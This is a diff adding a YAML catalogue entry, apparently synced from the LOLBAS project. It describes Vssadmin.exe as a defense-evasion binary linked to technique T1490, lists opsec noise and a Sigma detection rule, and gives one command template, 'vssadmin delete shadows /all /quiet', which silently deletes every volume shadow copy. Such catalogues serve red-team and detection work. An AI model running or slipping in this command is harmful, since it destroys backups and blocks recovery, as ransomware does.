@@ -1,0 +1,29 @@
+id: lolbas/vssadmin/tamper/0
+type: binary
+platform: windows
+name: Vssadmin.exe
+phases:
+- defense-evasion
+capabilities:
+- defense-evasion
+privilege_required: admin
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 67781fd
+  last_synced: '2026-08-28'
+attack_techniques:
+- T1490
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml
+commands:
+- template: vssadmin delete shadows /all /quiet
+  comment: Delete all volume shadow copies on the host without prompting
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Vssadmin/
+tags:
+- windows
+- lolbas
